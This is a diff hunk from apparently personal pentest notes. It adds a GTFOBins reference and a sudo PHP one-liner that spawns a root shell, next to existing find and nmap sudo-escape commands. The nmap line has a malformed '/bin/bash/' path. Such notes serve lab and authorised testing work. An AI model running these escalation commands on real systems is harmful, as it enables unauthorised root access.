@@ -203,6 +203,13 @@ sudo find /home -exec /bin/bash \;
 ```
 
 ```
+https://gtfobins.github.io/gtfobins/php/
+e.g. for php to gain privilege
+sudo -u user_name php -r "system('/bin/sh');"
+
+```
+
+```
 NMAP
 echo "os.execute('/bin/bash/')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
 $ sudo nmap --interactive
